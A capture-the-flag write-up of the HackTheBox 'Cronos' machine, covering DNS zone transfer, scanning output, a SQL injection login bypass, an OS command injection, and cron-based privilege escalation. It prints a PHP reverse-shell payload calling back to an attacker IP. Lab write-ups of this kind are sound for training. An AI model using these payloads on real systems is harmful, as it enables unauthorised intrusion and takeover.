# Cronos

## Information Gathering
10.10.10.13<br>
Cronos<br>

Software Versions
- OpenSSH 7.2p2
- ISC BIND 9.10.3-P4
- Apache httpd 2.4.18

This box only has the default apache ubuntu page when connecting to it. I see that there is a DNS server running on this box and have to assume that the domain name is cronos.htb. I also attempt to perform a zone tranfser using dig and see if there are any subdomains:
```bash
dig axfr @10.10.10.13 cronos.htb

; <<>> DiG 9.18.0-2-Debian <<>> axfr @10.10.10.13 cronos.htb
; (1 server found)
;; global options: +cmd
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 28 msec
;; SERVER: 10.10.10.13#53(10.10.10.13) (TCP)
;; WHEN: Fri Feb 25 12:42:45 EST 2022
;; XFR size: 7 records (messages 1, bytes 203)
```
Which has us stumble upon a subdomain admin.cronos.htb.

## Enumeration
Of course, start with your nmap scan.
```bash
# Nmap 7.92 scan initiated Wed Feb 23 14:54:17 2022 as: nmap -p- -A -oN nmap/all_ports.nmap 10.10.10.13
Nmap scan report for 10.10.10.13
Host is up (0.028s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.13 (92%), Linux 3.2 - 4.9 (92%), Linux 4.8 (92%), Linux 4.9 (91%), Linux 3.12 (90%), Linux 3.13 or 4.2 (90%), Linux 3.16 (90%), Linux 3.16 - 4.6 (90%), Linux 3.18 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   27.78 ms 10.10.14.1
2   27.80 ms 10.10.10.13

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb 23 14:56:51 2022 -- 1 IP address (1 host up) scanned in 154.78 seconds

```
I add both cronos.htb and admin.cronos.htb to my /etc/hosts file. Cronos.htb is running a web-applicication called Laravel. After a bit of poking around (looking at cookies, seeing if debugging mode is on) I come up with nothing. I also run a Nikto scan on both cronos.htb:
```bash
- Nikto v2.1.6/2.1.5
+ Target Host: 10.10.10.13
+ Target Port: 80
+ GET The anti-clickjacking X-Frame-Options header is not present.
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ HEAD Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ GET Server may leak inodes via ETags, header found with file /, inode: 2caf, size: 5b7cbd6fbb19d, mtime: gzip
+ OPTIONS Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ OSVDB-3233: GET /icons/README: Apache default file found.
- Nikto v2.1.6/2.1.5
+ Target Host: cronos.htb
+ Target Port: 80
+ GET The anti-clickjacking X-Frame-Options header is not present.
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ GET Cookie XSRF-TOKEN created without the httponly flag
+ HEAD Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS Allowed HTTP Methods: GET, HEAD 
+ OSVDB-3092: GET /web.config: ASP config file is accessible.
+ OSVDB-3268: GET /css/: Directory indexing found.
+ OSVDB-3092: GET /css/: This might be interesting...
+ OSVDB-3233: GET /icons/README: Apache default file found.

```
And on admin.cronos.htb:
```bash
- Nikto v2.1.6/2.1.5
+ Target Host: admin.cronos.htb
+ Target Port: 80
+ GET The anti-clickjacking X-Frame-Options header is not present.
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ GET Cookie PHPSESSID created without the httponly flag
+ HEAD Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ QLSIJBUM Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ GET /config.php: PHP Config file may contain database IDs and passwords.
+ OSVDB-3233: GET /icons/README: Apache default file found.
- Nikto v2.1.6/2.1.5
+ Target Host: admin.cronos.htb
+ Target Port: 80
+ GET The anti-clickjacking X-Frame-Options header is not present.
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ GET Cookie PHPSESSID created without the httponly flag
+ HEAD Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ EJHOKXQB Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ GET /config.php: PHP Config file may contain database IDs and passwords.
+ OSVDB-3233: GET /icons/README: Apache default file found.

```
Because admin.cronos.htb seems more interesting, I turn my attention to it and run a Gobuster scan:
```bash
/welcome.php          (Status: 302) [Size: 439] [--> index.php]
/index.php            (Status: 200) [Size: 1547]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/config.php           (Status: 200) [Size: 0]
/session.php          (Status: 302) [Size: 0] [--> index.php]
/server-status        (Status: 403) [Size: 304]
```

## Exploitation
After a bit of fiddling around, I figure out that there is a SQLi in the username POST parameter. The classic <b>' OR 1=1-- </b> authenticates you. In welcome.php there are two commands that you can run from the web application: traceroute and ping. Both commands are vulnerable to OS command injection. Using the payload:
```php
; php -r '$sock=fsockopen("10.10.14.122",1337);exec("/bin/sh -i <&3 >&3 2>&3");'
```
While having a listener running gives you foothold onto the machine. 

## Privilege Escalation
For a while I thought I needed to pivot over to the user noulis by accessing the internal MySQL database and cracking password hashes. The MySQL username, password, and database name are all provided in config.php. However, this does not work. I also run LinEnum.sh and find something interesting in /etc/crontab
```bash
# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```
As www-data I have write permissions to artisan. I replace the script with a reverse shell php script, start a listener, and catch a root shell.